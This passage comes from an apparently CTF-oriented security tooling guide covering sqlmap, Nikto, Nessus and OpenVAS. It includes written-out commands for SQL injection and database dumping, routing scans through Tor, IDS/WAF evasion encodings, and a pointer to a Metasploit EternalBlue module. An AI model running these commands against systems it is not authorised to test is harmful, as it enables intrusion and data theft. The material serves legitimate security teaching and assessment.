sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"
```

**Tor integration**:

```bash
# Start Tor service
service tor start

# Use Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor
```

### Session Management

**Resume session**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --flush-session
```

**Skip tests for known parameters**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --skip="id"
```

**Batch mode** (non-interactive):

```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

**Output to specific directory**:

```bash
sqlmap -u "http://target.com/page.php?id=1" --output-dir=/tmp/sqlmap_output
```

### Practical CTF Examples

**DVWA SQL Injection (low security)**:

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" --dbs
```

**POST-based login bypass**:

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" -p username --technique=B --batch
```

**JSON API injection**:

```bash
sqlmap -u "http://target.com/api/user" --data='{"id":"1"}' -H "Content-Type: application/json" --dump
```

**XML injection**:

```bash
sqlmap -u "http://target.com/api" --data='<?xml version="1.0"?><user><id>1</id></user>' -H "Content-Type: application/xml"
```

### Common Errors and Solutions

**Error**: "All tested parameters do not appear to be injectable"

```bash
# Solutions:
--level=5 --risk=3  # Increase test depth
--technique=T       # Force time-based if others fail
--string="text"     # Specify expected response text
--dbms=MySQL        # Specify if you know DBMS
--tamper=space2comment  # Try WAF bypass
```

**Error**: "Connection timeout"

```bash
--timeout=30        # Increase timeout
--retries=5         # Increase retries
--delay=2           # Add delay between requests
```

**Error**: "CAPTCHA detected"

```bash
# Requires manual intervention or CAPTCHA solving service integration
# Not natively supported by sqlmap
```

## Nikto

### Basic Usage

**Installation verification**:

```bash
nikto -Version
```

**Simple scan**:

```bash
nikto -h http://target.com
```

**HTTPS target**:

```bash
nikto -h https://target.com
```

**Specific port**:

```bash
nikto -h target.com -p 8080
```

**Multiple ports**:

```bash
nikto -h target.com -p 80,443,8080,8443
```

**Port range**:

```bash
nikto -h target.com -p 80-9000
```

### Scan Configuration

**Tuning options** (specific test categories):

```bash
nikto -h target.com -Tuning x
```

Tuning values:

```
0: File Upload
1: Interesting File / Seen in logs
2: Misconfiguration / Default File
3: Information Disclosure
4: Injection (XSS/Script/HTML)
5: Remote File Retrieval - Inside Web Root
6: Denial of Service
7: Remote File Retrieval - Server Wide
8: Command Execution / Remote Shell
9: SQL Injection
a: Authentication Bypass
b: Software Identification
c: Remote Source Inclusion
x: Reverse Tuning (exclude specified tests)
```

**Multiple tuning**:

```bash
nikto -h target.com -Tuning 1,2,3,9
```

**Exclude tests**:

```bash
nikto -h target.com -Tuning x 6  # Exclude DoS tests
```

**Database selection**:

```bash
nikto -h target.com -dbcheck
```

Shows available databases and allows selection of specific vulnerability databases.

### Authentication

**HTTP Basic authentication**:

```bash
nikto -h target.com -id admin:password
```

**Form-based authentication**:

```bash
nikto -h target.com -id admin:password -evasion 1
```

**Custom headers**:

```bash
nikto -h target.com -useragent "Mozilla/5.0 Custom" -H "Authorization: Bearer token123"
```

### Output and Reporting

**Output formats**:

```bash
# Text file
nikto -h target.com -o scan_results.txt

# HTML report
nikto -h target.com -o scan_results.html -Format html

# XML output
nikto -h target.com -o scan_results.xml -Format xml

# CSV format
nikto -h target.com -o scan_results.csv -Format csv
```

**Multiple output formats**:

```bash
nikto -h target.com -o results -Format htm,txt,csv
```

Creates: results.html, results.txt, results.csv

### Advanced Options

**SSL/TLS options**:

```bash
# Force SSL (even if not on 443)
nikto -h target.com -ssl

# Ignore SSL certificate errors
nikto -h target.com -ssl -nossl
```

**Proxy configuration**:

```bash
nikto -h target.com -useproxy http://127.0.0.1:8080
```

**Custom User-Agent**:

```bash
nikto -h target.com -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

**Timeout settings**:

```bash
nikto -h target.com -timeout 10
```

**Virtual host**:

```bash
nikto -h 10.10.10.100 -vhost target.com
````

Useful when IP doesn't match hostname (shared hosting, CDN).

**CGI directory specification**:
```bash
nikto -h target.com -Cgidirs "/cgi-bin/,/scripts/,/cgi/"
````

**No 404 checking**:

```bash
nikto -h target.com -no404
```

Skips smart 404 detection (faster but less accurate).

**Mutate checks**:

```bash
nikto -h target.com -mutate 1
```

Mutation options:

```
1: Test all files with all root directories
2: Guess for password file names
3: Enumerate user names via Apache (/~user)
4: Enumerate user names via cgiwrap (/cgi-bin/cgiwrap/~user)
5: Attempt to brute force sub-domain names
6: Attempt to guess directory names from dictionary file
```

**Multiple mutations**:

```bash
nikto -h target.com -mutate 1,2,3
```

**Plugin selection**:

```bash
# List available plugins
nikto -list-plugins

# Use specific plugins
nikto -h target.com -Plugins "apacheusers,cookies"
```

Common plugins:

```
apache_expect_xss: Tests for XSS in Apache Expect header
apacheusers: Enumerates Apache user directories
cookies: Checks for interesting cookies
dictionary: Dictionary-based attacks
headers: Checks HTTP headers
httpoptions: Checks HTTP OPTIONS method
msgs: Prints messages about scan
negotiate: Checks for Negotiate authentication
outdated: Checks for outdated software
paths: Checks for interesting paths
put_del_test: Tests PUT and DELETE methods
shellshock: Tests for Shellshock vulnerability
siebel: Siebel-specific tests
ssl: SSL/TLS checks
```

### Evasion Techniques

**Evasion encoding**:

```bash
nikto -h target.com -evasion 1
```

Evasion types:

```
1: Random URI encoding (non-UTF8)
2: Directory self-reference (/.//)
3: Premature URL ending
4: Prepend long random string
5: Fake parameter
6: TAB as request spacer
7: Change case of URL
8: Use Windows directory separator (\)
```

**Multiple evasions**:

```bash
nikto -h target.com -evasion 1,2,3,7
```

**LibWhisker IDS evasion**:

```bash
nikto -h target.com -evasion 1,2,3,4,5,6,7,8
```

[Inference]: Evasion effectiveness varies by target WAF/IDS; testing multiple combinations may be required.

### Scan Optimization

**Fast mode** (minimal tests):

```bash
nikto -h target.com -Fast
```

**Display options**:

```bash
# Verbose output
nikto -h target.com -Display V

# Show redirects
nikto -h target.com -Display 1

# Show cookies
nikto -h target.com -Display 2

# Show all 200 responses
nikto -h target.com -Display 3

# Show URLs requiring authentication
nikto -h target.com -Display 4

# Debug output
nikto -h target.com -Display D

# Show all HTTP errors
nikto -h target.com -Display E
```

**Multiple display options**:

```bash
nikto -h target.com -Display 1,2,V
```

**Resume scan**:

```bash
# Save session
nikto -h target.com -Save session.txt

# Resume from session
nikto -h target.com -Resume session.txt
```

### Scanning Multiple Targets

**From file**:

```bash
# Create targets file (targets.txt)
cat > targets.txt << EOF
http://target1.com
http://target2.com
https://target3.com:8443
EOF

nikto -h targets.txt
```

**IP range** (requires nmap format):

```bash
# Using nmap output
nmap -p 80,443 -oG - 10.10.10.0/24 | nikto -h -
```

### Database Updates

**Update vulnerability database**:

```bash
nikto -update
```

**Check database version**:

```bash
nikto -Version
```

Database location:

```
/usr/share/nikto/databases/
```

### Practical CTF Examples

**Basic web server scan**:

```bash
nikto -h http://10.10.10.100 -o nikto_scan.html -Format html
```

**Authenticated scan with custom headers**:

```bash
nikto -h http://target.com -id admin:password -H "X-Custom-Header: value" -Tuning 1,2,3,9
```

**SSL/TLS vulnerability scan**:

```bash
nikto -h https://target.com -ssl -Plugins ssl -o ssl_results.txt
```

**Comprehensive scan with evasion**:

```bash
nikto -h target.com -Tuning 1,2,3,4,9,b -evasion 1,2,7 -useproxy http://127.0.0.1:8080 -o comprehensive_scan.html -Format html
```

**Quick reconnaissance**:

```bash
nikto -h target.com -Fast -Tuning b -Display 1,2
```

**Testing for Shellshock**:

```bash
nikto -h target.com -Plugins shellshock
```

**Scanning through Burp/ZAP**:

```bash
nikto -h target.com -useproxy http://127.0.0.1:8080 -Tuning 1,2,3,4,9
```

### Output Analysis

**Common findings interpretation**:

```
+ Server: Apache/2.4.7 (Ubuntu)
```

→ Version disclosure, check for known vulnerabilities

```
+ The anti-clickjacking X-Frame-Options header is not present
```

→ Clickjacking vulnerability possible

```
+ OSVDB-3092: /admin/: This might be interesting
```

→ Discovered interesting directory, manual investigation needed

```
+ OSVDB-3233: /icons/README: Apache default file found
```

→ Information disclosure, default installation

```
+ Cookie PHPSESSID created without the httponly flag
```

→ Session cookie vulnerable to XSS theft

```
+ /config.php: PHP Config file may contain database IDs and passwords
```

→ Potential sensitive file exposure

### Integration with Other Tools

**Nikto + Nmap**:

```bash
# Scan ports first
nmap -p- -oG - target.com | nikto -h -
```

**Nikto + Metasploit**:

```bash
# Generate Metasploit-compatible output
nikto -h target.com -o nikto.xml -Format msf+

# Import in Metasploit
msfconsole
db_import nikto.xml
```

**Nikto with Burp Suite**:

```bash
# Configure Nikto to use Burp as proxy
nikto -h target.com -useproxy http://127.0.0.1:8080

# Review all requests in Burp's HTTP history
```

### Configuration File

**Custom nikto.conf**:

```bash
# Location
/etc/nikto.conf

# Key settings
EXECDIR=/usr/share/nikto
PLUGINDIR=/usr/share/nikto/plugins
DBDIR=/usr/share/nikto/databases
TEMPLATEDIR=/usr/share/nikto/templates
```

**Custom configuration**:

```bash
# Create custom config
cat > custom_nikto.conf << EOF
# Custom timeout
TIMEOUT=20

# Custom User-Agent
USERAGENT=Mozilla/5.0 Custom Scanner

# Disable updates check
UPDATES=no

# Enable SSL by default
SSL=yes
EOF

# Use custom config
nikto -h target.com -config custom_nikto.conf
```

### Common Use Cases

**Web server fingerprinting**:

```bash
nikto -h target.com -Tuning b -Display V
```

**Directory and file discovery**:

```bash
nikto -h target.com -Tuning 1,2 -mutate 6
```

**Configuration issue detection**:

```bash
nikto -h target.com -Tuning 2,3
```

**Injection vulnerability scanning**:

```bash
nikto -h target.com -Tuning 4,9
```

**Authentication testing**:

```bash
nikto -h target.com -Tuning a
```

### Limitations and Considerations

**False positives**:

- Nikto generates many false positives
- Manual verification required for findings
- Context-dependent vulnerabilities may be missed

**Noise generation**:

- Creates significant log entries
- Easily detected by IDS/IPS
- Not suitable for stealth reconnaissance

**Performance**:

- Single-threaded scanning
- Slower than modern alternatives
- Sequential request processing

[Inference]: Nikto is best used for initial reconnaissance; detailed exploitation requires manual testing or specialized tools.

### Alternative Usage Patterns

**Quick check before detailed testing**:

```bash
nikto -h target.com -Fast -Tuning b,1,2 | tee quick_check.txt
```

**Combining with manual testing**:

```bash
# Run Nikto through intercepting proxy
nikto -h target.com -useproxy http://127.0.0.1:8080

# Review requests in Burp/ZAP
# Replay interesting findings manually
```

**Automated reporting workflow**:

```bash
#!/bin/bash
TARGET=$1
DATE=$(date +%Y%m%d_%H%M%S)

# Run scan
nikto -h $TARGET -o "nikto_${TARGET}_${DATE}.html" -Format html -Tuning 1,2,3,4,9,b

# Generate summary
grep -E "^\+" "nikto_${TARGET}_${DATE}.html" > "summary_${TARGET}_${DATE}.txt"

# Alert if critical findings
if grep -qi "SQL Injection\|Remote Code" "summary_${TARGET}_${DATE}.txt"; then
    echo "CRITICAL findings detected in $TARGET" | mail -s "Nikto Alert" admin@example.com
fi
```

### Debugging and Troubleshooting

**Verbose debugging**:

```bash
nikto -h target.com -Display D,V
```

**Connection testing**:

```bash
# Test connectivity
nikto -h target.com -vhost target.com -Display V

# Check proxy connection
nikto -h target.com -useproxy http://127.0.0.1:8080 -Display V
```

**Plugin debugging**:

```bash
# Test specific plugin
nikto -h target.com -Plugins dictionary -Display D
```

**Common errors and solutions**:

```
Error: No 'host' specified
```

→ Use -h flag with target URL

```
Error: Can't locate LW2.pm
```

→ Install perl-libwhisker2: `apt install libwhisker2-perl`

```
Error: SSL connect attempt failed
```

→ Use -nossl flag or verify SSL configuration

```
Error: Invalid HTTP response
```

→ Check target accessibility, try -vhost parameter

### Performance Tuning

**Faster scanning**:

```bash
# Reduce timeout
nikto -h target.com -timeout 5

# Limit test scope
nikto -h target.com -Tuning 1,2,b -Fast

# Skip slow tests
nikto -h target.com -Tuning x 6,7
```

**Resource-intensive scanning**:

```bash
# Comprehensive with mutations
nikto -h target.com -Tuning 1,2,3,4,5,9,a,b -mutate 1,2,3,6 -timeout 30
```

### Comparison with Other Tools

|Feature|Nikto|dirb/gobuster|WPScan|Nuclei|
|---|---|---|---|---|
|General web vulns|Yes|No|WordPress only|Yes|
|Directory brute force|Limited|Excellent|Limited|No|
|Speed|Slow|Fast|Medium|Very Fast|
|False positives|High|Low|Low|Low|
|Evasion|Basic|None|None|Advanced|
|Reporting|Good|Basic|Excellent|Excellent|

[Inference]: Tool selection should depend on specific testing requirements and target characteristics.

---

**Related topics**: Web application enumeration, vulnerability assessment automation, reporting and documentation, reconnaissance methodology, web application firewalls bypass techniques

---

## Nessus

### Overview

Nessus is a proprietary vulnerability scanner developed by Tenable that identifies security vulnerabilities, misconfigurations, and compliance issues across networks, systems, and applications. In CTF contexts, it's used for reconnaissance and identifying exploitable vulnerabilities.

### Installation and Setup

**Installing Nessus on Kali Linux:**

```bash
# Download Nessus (requires registration at tenable.com)
# Get the .deb package for Debian/Ubuntu/Kali

# Install dependencies
sudo apt update
sudo apt install -y libssl1.1

# Install Nessus package
sudo dpkg -i Nessus-10.x.x-debian10_amd64.deb

# Start Nessus service
sudo systemctl start nessusd

# Enable on boot
sudo systemctl enable nessusd

# Check status
sudo systemctl status nessusd

# Access web interface (wait 2-3 minutes for initialization)
# Navigate to: https://localhost:8834
```

**Initial configuration:**

```bash
# Create admin account through web interface
# Username: admin
# Password: [create strong password]

# Activate with activation code from Tenable
# Free option: Nessus Essentials (limited to 16 IPs)
# Paid: Nessus Professional (unlimited)

# Wait for plugin compilation (can take 30-60 minutes)
```

**Command-line management:**

```bash
# Start/stop service
sudo systemctl start nessusd
sudo systemctl stop nessusd
sudo systemctl restart nessusd

# Check listening port
sudo netstat -tlnp | grep nessusd
# Default: 127.0.0.1:8834

# View logs
sudo tail -f /opt/nessus/var/nessus/logs/nessusd.messages

# Reset admin password
sudo /opt/nessus/sbin/nessuscli chpasswd admin

# Update plugins manually
sudo /opt/nessus/sbin/nessuscli update
```

### Web Interface Navigation

**Creating a scan:**

```
1. Click "New Scan"
2. Select scan template:
   - Basic Network Scan: General vulnerability assessment
   - Advanced Scan: Customizable options
   - Web Application Tests: Web-specific vulnerabilities
   - Malware Scan: Malware detection
   - Custom: Full control

3. Configure scan settings:
   - Name: descriptive scan name
   - Targets: IP addresses or ranges
   - Schedule: immediate or scheduled
```

**Scan configuration options:**

```
BASIC Tab:
- Name: Scan identifier
- Description: Optional notes
- Folder: Organization
- Targets: 192.168.1.100, 192.168.1.1-254, 10.10.10.0/24
- Upload target file: List of IPs/hostnames

DISCOVERY Tab:
- Ping Method: ICMP, ARP, TCP, none
- Port Scan Range: default, all, custom
- Port Scan Method: SYN, TCP Connect, UDP

ASSESSMENT Tab:
- General: Web application scanning, brute force
- Brute Force: Enable/disable credential attacks
- Windows: SMB, WMI scanning
- Web Applications: Crawling depth, test methods

REPORT Tab:
- Output format preferences
- Verbosity level

ADVANCED Tab:
- Performance: Scan speed, timeouts
- Safe Checks: Avoid service disruption
```

### Common Scan Templates

**Basic Network Scan:**

```bash
# Quick vulnerability identification
# Targets: Single host or small network
# Use case: Initial reconnaissance

Target: 192.168.1.100
Duration: ~15-30 minutes per host
Findings: Critical, High, Medium, Low, Info
```

**Advanced Scan:**

```bash
# Comprehensive scanning with custom options
# Use case: Detailed assessment with specific requirements

# Custom configuration:
Port range: 1-65535
Thorough tests: Enabled
Safe checks: Disabled (careful!)
```

**Web Application Tests:**

```bash
# Focused on web vulnerabilities
# Targets: Web servers and applications

# Tests include:
- SQL injection
- XSS
- CSRF
- Directory traversal
- Authentication bypass
- SSL/TLS issues
```

**Credentialed Scan:**

```bash
# Authenticated scanning with provided credentials
# Provides deeper assessment

# Credentials tab:
Windows: Username/password, domain
SSH: Username/password or private key
SNMP: Community string
Database: Connection details
```

### Running Scans

**Basic scan execution:**

```bash
# Through web interface:
1. Configure scan parameters
2. Click "Save"
3. Click launch icon (▶)
4. Monitor progress in real-time

# Scan status indicators:
- Running: In progress
- Completed: Finished successfully
- Stopped: Manually halted
- Paused: Temporarily suspended
```

**Target specification formats:**

```
Single host:
192.168.1.100
target.com

Multiple hosts:
192.168.1.100,192.168.1.101,192.168.1.102

Range:
192.168.1.1-254
192.168.1.100-192.168.1.200

CIDR notation:
192.168.1.0/24
10.10.10.0/16

File import:
targets.txt containing one IP/hostname per line
```

**Scan control during execution:**

```bash
# Pause scan
Click "Pause" button - useful for rate limiting

# Resume scan
Click "Resume" to continue

# Stop scan
Click "Stop" - cannot be resumed, must restart

# Real-time monitoring
View "Hosts" tab for live results
```

### Analyzing Results

**Vulnerability severity levels:**

```
Critical (Red):
- Severity score: 9.0-10.0
- Immediate action required
- Examples: Remote code execution, default credentials

High (Orange):
- Severity score: 7.0-8.9
- Serious vulnerabilities
- Examples: SQL injection, privilege escalation

Medium (Yellow):
- Severity score: 4.0-6.9
- Moderate risk
- Examples: Information disclosure, weak ciphers

Low (Green):
- Severity score: 0.1-3.9
- Minor issues
- Examples: Banner disclosure, obsolete software

Info (Blue):
- Severity score: 0.0
- Informational findings
- Examples: Open ports, OS detection
```

**Vulnerability details:**

```
For each finding:
- Plugin ID: Unique identifier
- Name: Vulnerability description
- Synopsis: Brief summary
- Description: Detailed explanation
- Solution: Remediation steps
- See Also: References, CVEs
- Risk Factor: Critical/High/Medium/Low
- CVSS Score: Numerical risk rating
- Output: Specific evidence from target
```

**Filtering and sorting:**

```bash
# Filter by severity
Click severity level to filter (Critical, High, etc.)

# Filter by host
Select specific target from host list

# Search functionality
Use search bar for specific CVEs or keywords

# Export options:
- PDF: Executive report
- HTML: Detailed web report
- CSV: Data analysis
- Nessus: Import into another instance
```

**Reading vulnerability output:**

```
Example vulnerability:
Plugin ID: 10267
Name: SSH Server CBC Mode Ciphers Enabled
Synopsis: The SSH server is configured to use CBC mode ciphers
Description: The SSH server is configured to support CBC mode...
Solution: Configure the SSH server to disable CBC mode ciphers
CVE: N/A
CVSS Base Score: 4.3 (Medium)

Plugin Output:
The following CBC mode ciphers are supported:
  aes128-cbc
  aes256-cbc
  3des-cbc
```

### Advanced Features

**Policy customization:**

```bash
# Create custom policy
1. Policies > New Policy
2. Select base template
3. Customize plugins:
   - Enable/disable specific checks
   - Configure plugin families
   - Set scan preferences

# Plugin families:
- Backdoors
- Brute force attacks
- CGI abuses
- Databases
- Denial of Service
- FTP
- Firewalls
- Gain a shell remotely
- General
- Miscellaneous
- Netware
- Port scanners
- Service detection
- Settings
- SMTP problems
- SNMP
- Web Servers
- Windows
```

**Compliance scanning:**

```bash
# Check compliance against standards
# Available in Professional/Enterprise versions

Standards supported:
- CIS Benchmarks
- PCI DSS
- HIPAA
- NIST
- DISA STIG

# Configure compliance audit:
1. Select compliance template
2. Upload audit file (.audit)
3. Configure credentials
4. Run scan
5. Review compliance report
```

**Vulnerability management:**

```bash
# Track remediation over time
1. Run baseline scan
2. Export results
3. Apply patches/fixes
4. Run follow-up scan
5. Compare results

# Comparison view shows:
- New vulnerabilities
- Resolved issues
- Changed findings
```

### Command-Line Interface (nessuscli)

**User management:**

```bash
# List users
sudo /opt/nessus/sbin/nessuscli user list

# Add user
sudo /opt/nessus/sbin/nessuscli adduser username

# Delete user
sudo /opt/nessus/sbin/nessuscli rmuser username

# Change password
sudo /opt/nessus/sbin/nessuscli chpasswd username

# Set administrator privilege
sudo /opt/nessus/sbin/nessuscli chpasswd username --administrator
```

**Plugin management:**

```bash
# Update plugins
sudo /opt/nessus/sbin/nessuscli update --plugins-only

# Full update (includes code)
sudo /opt/nessus/sbin/nessuscli update

# Check plugin version
sudo /opt/nessus/sbin/nessuscli update --plugins-only --check

# List installed plugins
sudo /opt/nessus/sbin/nessuscli plugin list
```

**System operations:**

```bash
# Fix plugin database
sudo /opt/nessus/sbin/nessuscli fix --reset-plugin-database

# Reset to factory defaults (dangerous!)
sudo /opt/nessus/sbin/nessuscli fix --reset

# Fetch feed information
sudo /opt/nessus/sbin/nessuscli fetch --register XXXX-XXXX-XXXX-XXXX
```

### CTF and Penetration Testing Usage

**Initial reconnaissance workflow:**

```bash
# Step 1: Quick discovery scan
# Template: Host Discovery
# Purpose: Identify live hosts

# Step 2: Port scan
# Template: Basic Network Scan
# Purpose: Identify open services

# Step 3: Vulnerability scan
# Template: Advanced Scan
# Purpose: Find exploitable issues

# Step 4: Targeted scan
# Template: Web Application Tests (if web services found)
# Purpose: Web-specific vulnerabilities
```

**Identifying exploitable vulnerabilities:**

```bash
# Focus on:
1. Critical/High severity findings
2. Remote code execution vulnerabilities
3. Default credentials
4. Unauthenticated access
5. Known exploits (check Metasploit availability)

# Example critical findings to prioritize:
- MS17-010 (EternalBlue)
- Apache Struts RCE
- Shellshock (Bash)
- Heartbleed (OpenSSL)
- Default Tomcat credentials
```

**Extracting actionable intelligence:**

```python
#!/usr/bin/env python3
# Parse Nessus XML export for high-value targets

import xml.etree.ElementTree as ET

def parse_nessus_xml(xml_file):
    """Extract critical/high vulnerabilities from Nessus XML"""
    
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    critical_vulns = []
    
    for report_host in root.findall('.//ReportHost'):
        host_ip = report_host.get('name')
        
        for report_item in report_host.findall('ReportItem'):
            severity = report_item.get('severity')
            
            # Focus on Critical (4) and High (3)
            if severity in ['3', '4']:
                vuln_info = {
                    'host': host_ip,
                    'port': report_item.get('port'),
                    'plugin_id': report_item.get('pluginID'),
                    'plugin_name': report_item.get('pluginName'),
                    'severity': 'Critical' if severity == '4' else 'High',
                }
                
                # Extract CVE if available
                cve_elem = report_item.find('cve')
                if cve_elem is not None:
                    vuln_info['cve'] = cve_elem.text
                
                # Extract Metasploit module if mentioned
                synopsis = report_item.find('synopsis')
                if synopsis is not None and 'exploit' in synopsis.text.lower():
                    vuln_info['exploitable'] = True
                
                critical_vulns.append(vuln_info)
    
    return critical_vulns

# Usage
vulns = parse_nessus_xml('scan_results.nessus')
for vuln in vulns:
    print(f"[{vuln['severity']}] {vuln['host']}:{vuln['port']} - {vuln['plugin_name']}")
```

**Exporting results for further analysis:**

```bash
# Export scan results
1. Select completed scan
2. Click "Export" button
3. Choose format:
   - Nessus (.nessus): XML format for parsing
   - PDF: Human-readable report
   - HTML: Interactive web report
   - CSV: Spreadsheet analysis

# Parse .nessus file with tools:
- nessus-xmlrpc
- pynessus
- Custom Python scripts
```

### Integration with Other Tools

**Nessus to Metasploit:**

```bash
# Export Nessus results to Metasploit
# Note: Direct integration requires commercial MSF Pro

# Manual workflow:
1. Export Nessus scan as .nessus XML
2. Parse for vulnerable services
3. Search Metasploit for matching exploits

# Example: Finding MS17-010 in Nessus
# Then in Metasploit:
msfconsole
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

**Scripted vulnerability extraction:**

```bash
#!/bin/bash
# Extract specific vulnerabilities from Nessus export

NESSUS_FILE="scan.nessus"

# Extract all CVEs
grep -oP 'CVE-\d{4}-\d+' "$NESSUS_FILE" | sort -u > cves.txt

# Extract hosts with critical vulnerabilities
grep -B 5 'severity="4"' "$NESSUS_FILE" | grep "ReportHost name" | \
  grep -oP 'name="\K[^"]+' | sort -u > critical_hosts.txt

# Count vulnerabilities by severity
echo "Critical: $(grep -c 'severity="4"' $NESSUS_FILE)"
echo "High: $(grep -c 'severity="3"' $NESSUS_FILE)"
echo "Medium: $(grep -c 'severity="2"' $NESSUS_FILE)"
echo "Low: $(grep -c 'severity="1"' $NESSUS_FILE)"
```

### Performance Optimization

**Scan tuning:**

```bash
# Adjust performance settings
Settings > Advanced > Performance

# Options:
Max simultaneous checks per host: 5 (default)
- Lower: More stable, slower
- Higher: Faster, more aggressive

Max simultaneous hosts per scan: 5 (default)
- Increase for larger networks

Network timeout: 5 seconds (default)
- Increase for slow networks

# Safe checks: Enable/Disable
- Enabled: Avoids disruptive tests
- Disabled: More thorough but may crash services
```

**Reducing false positives:**

```bash
# Enable safe checks
# Disable DoS plugins
# Use credentialed scanning for accuracy

# Review plugin output carefully
# Cross-reference with manual verification
```

### Limitations and Considerations

[Inference] Nessus may produce false positives, particularly for banner-based detections where version strings don't necessarily indicate vulnerability presence.

```bash
# Known limitations:
1. Requires network access to targets
2. May miss vulnerabilities requiring authentication
3. Plugin updates needed for latest vulnerabilities
4. Can be resource-intensive
5. May trigger IDS/IPS alerts

# Best practices:
- Always verify findings manually
- Use credentialed scans when possible
- Schedule scans during maintenance windows
- Rate-limit aggressive scans
- Review plugin output, not just summary
```

---

## OpenVAS

### Overview

OpenVAS (Open Vulnerability Assessment System) is an open-source vulnerability scanner and manager, part of the Greenbone Vulnerability Management (GVM) framework. It provides comprehensive vulnerability scanning capabilities without licensing costs.

### Installation and Setup

**Installing OpenVAS/GVM on Kali Linux:**

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install OpenVAS/GVM
sudo apt install -y gvm

# Run setup script (takes 20-30 minutes)
sudo gvm-setup

# The script will:
# - Download NVT feed (Network Vulnerability Tests)
# - Create certificates
# - Configure database
# - Create admin user
# - Display generated password

# Example output:
# [>] User created with password 'GENERATED_PASSWORD'.

# Start GVM services
sudo gvm-start

# Check service status
sudo gvm-check-setup

# Access web interface
# URL: https://127.0.0.1:9392
# Username: admin
# Password: [generated password from setup]
```

**Manual service management:**

```bash
# Start all services
sudo gvm-start

# Stop all services
sudo gvm-stop

# Check individual services
sudo systemctl status ospd-openvas
sudo systemctl status gvmd
sudo systemctl status gsad

# Restart individual services
sudo systemctl restart ospd-openvas
sudo systemctl restart gvmd
sudo systemctl restart gsad

# View logs
sudo tail -f /var/log/gvm/gvmd.log
sudo tail -f /var/log/gvm/openvas.log
```

**Feed synchronization:**

```bash
# Update vulnerability feeds
sudo greenbone-feed-sync --type GVMD_DATA
sudo greenbone-feed-sync --type SCAP
sudo greenbone-feed-sync --type CERT

# Or update all feeds
sudo greenbone-nvt-sync
sudo greenbone-feed-sync

# Check feed status
sudo gvm-feed-update

# Feed types:
# - NVT: Network Vulnerability Tests (actual scan plugins)
# - SCAP: Security Content Automation Protocol data
# - CERT: CERT advisories
# - GVMD_DATA: Port lists, report formats, scan configs
```

**Initial configuration:**

```bash
# Change admin password via CLI
sudo gvmd --user=admin --new-password=NewPassword123

# Create new user
sudo gvmd --create-user=scanner --password=ScanPass123

# List users
sudo gvmd --get-users

# Delete user
sudo gvmd --delete-user=scanner
```

### Web Interface (Greenbone Security Assistant)

**Dashboard navigation:**

```
Main sections:
- Scans: Manage tasks and results
- Assets: Hosts, operating systems discovered
- SecInfo: Vulnerability information, CVEs, CPEs
- Configuration: Scan configs, targets, credentials
- Administration: Users, roles, feeds
```

**Creating a target:**

```bash
# Navigate: Configuration > Targets > New Target

Settings:
- Name: Descriptive target name
- Hosts:
  * Manual: 192.168.1.100
  * From file: Upload host list
  * From host asset: Use discovered hosts
- Port List: Select predefined or custom
- Credentials: Optional for authenticated scans
```

**Configuring scan tasks:**

```bash
# Navigate: Scans > Tasks > New Task

Essential settings:
- Name: Task identifier
- Scan Targets: Select created target
- Scanner: OpenVAS Default
- Scan Config: Select scan type

# Scan Configs:
Full and fast:
  - Comprehensive scan
  - Balance between speed and thoroughness
  - Recommended for general use

Full and deep:
  - Most thorough scan
  - Longer duration
  - All NVT families enabled

Full and very deep:
  - Exhaustive scanning
  - May take hours/days
  - Maximum coverage

Base:
  - Minimal scanning
  - Quick assessment
  - Limited vulnerability checks

Discovery:
  - Host and service discovery only
  - No vulnerability checks
  - Fast reconnaissance

System Discovery:
  - Similar to Discovery
  - Focus on system identification
```

### Running Scans

**Starting a scan task:**

```bash
# Through web interface:
1. Navigate to Scans > Tasks
2. Find desired task
3. Click start icon (▶)
4. Monitor progress bar

# Scan states:
- New: Not yet started
- Requested: Queued to start
- Running: Currently executing
- Stop Requested: Stopping
- Stopped: Manually halted
- Done: Completed successfully
- Interrupted: Terminated unexpectedly
```

**Monitoring scan progress:**

```bash
# Real-time monitoring
# Click on running task to view details

# Information displayed:
- Progress percentage
- Hosts completed/total
- Current host being scanned
- Elapsed time
- Estimated time remaining

# Resource monitoring
top -u _openvas  # Check OpenVAS process CPU/memory
sudo tail -f /var/log/gvm/openvas.log  # Live log viewing
```

**Scan scheduling:**

```bash
# Schedule recurring scans
1. Create task
2. Click edit icon
3. Set schedule:
   - Once: Specific date/time
   - Daily: Every day at time
   - Weekly: Specific day of week
   - Monthly: Specific day of month
   - Custom: Cron-like expression

# Schedule examples:
Once: 2025-10-20 02:00
Daily: Every day at 02:00
Weekly: Every Sunday at 03:00
Monthly: 1st of month at 04:00
```

### Analyzing Results

**Viewing scan results:**

```bash
# Navigate: Scans > Results

# Result severity levels:
High (Red): 7.0-10.0 CVSS
- Critical vulnerabilities
- Immediate attention required

Medium (Yellow): 4.0-6.9 CVSS
- Moderate severity
- Should be addressed

Low (Blue): 0.1-3.9 CVSS
- Minor issues
- Lower priority

Log (Green): 0.0 CVSS
- Informational
- No direct risk
```

**Detailed vulnerability information:**

```bash
# Click on specific vulnerability

Details include:
- Name: Vulnerability title
- Severity: CVSS score
- NVT OID: Unique test identifier
- CVE: Associated CVE IDs
- Summary: Brief description
- Affected Software/OS: Target products
- Impact: Potential consequences
- Solution: Remediation guidance
- Vulnerability Detection Result: Specific evidence
- References: External resources
```

**Filtering results:**

```bash
# Filter options:
Severity: Select High/Medium/Low/Log
Host: Specific IP address
Location: Port/service
NVT: Specific vulnerability test
Solution type: Patch, mitigation, etc.

# Advanced filter syntax:
severity>7.0
host=192.168.1.100
port=443
```

**Generating reports:**

```bash
# Navigate: Scans > Reports

# Select report > Download icon

# Available formats:
- Anonymous XML: XML without host info
- ARF: Asset Reporting Format
- CPE: Common Platform Enumeration
- CSV Results: Spreadsheet format
- CSV Hosts: Host-centric CSV
- HTML: Web-viewable report
- ITG: verinice format
- LaTeX: Document preparation
